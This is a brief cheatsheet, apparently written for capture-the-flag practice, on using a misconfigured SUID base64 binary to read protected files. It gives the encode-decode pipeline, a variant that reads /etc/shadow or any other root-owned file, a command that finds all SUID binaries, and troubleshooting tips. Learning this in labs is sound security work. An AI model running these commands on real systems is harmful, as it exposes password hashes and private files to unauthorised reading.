# SUID base64 Exploitation — Cheatsheet

> Exploit a misconfigured SUID `base64` binary to read files owned by another user.

---

## The Command

```sh
# Read a file you shouldn't have access to via SUID base64
base64 /secret.flag | base64 -d
```

---

## Breaking Down the Flags

| command | flag | meaning | example |
|---------|------|---------|---------|
| `base64` | *(none)* | encode file contents to base64 | `base64 /secret.flag` |
| `base64` | `-d` | decode base64 back to plaintext | `base64 -d` |

---

## Encode → Decode Pipeline

| stage | command | output |
|-------|---------|--------|
| 1. Encode | `base64 /secret.flag` | base64-encoded string of file contents |
| 2. Pipe | `\|` | passes encoded string to next command |
| 3. Decode | `base64 -d` | original plaintext flag |

---

## What Each Stage Produces

| stage | output | example |
|-------|--------|---------|
| `base64 /secret.flag` | encoded blob | `Y3Rme...` |
| `\| base64 -d` | decoded plaintext | `ctf{de2b5650...}` |

---

## Common Variations

| goal | command |
|------|---------|
| Read flag | `base64 /secret.flag \| base64 -d` |
| Read any root-owned file | `base64 /etc/shadow \| base64 -d` |
| Find all SUID binaries on system | `find / -perm -4000 -type f 2>/dev/null` |
| Check if binary has SUID | `ls -la /bin/base64` — look for `rws` |
| Confirm you're running the SUID binary | `which base64` then `ls -la $(which base64)` |

---

## Gotchas

| ⚠️ Watch out | ✅ Do this instead |
|---|---|
| `/bin/base64` may be a busybox symlink — SUID won't work on it | Check `/usr/local/bin/base64` for the real binary |
| `rws` vs `rwx` in `ls -la` — easy to miss | Look specifically for `s` in position 4: `-rwsr-xr-x` |
| Running wrong `base64` (not the SUID one) | Run `which base64` — should resolve to the SUID binary |
| File permission denied even with SUID | Confirm the binary is owned by root: `ls -la $(which base64)` |
| Forgetting to decode — getting garbled output | Always pipe through `base64 -d` |
| SUID set on a symlink | SUID on symlinks is silently ignored — needs a real ELF binary |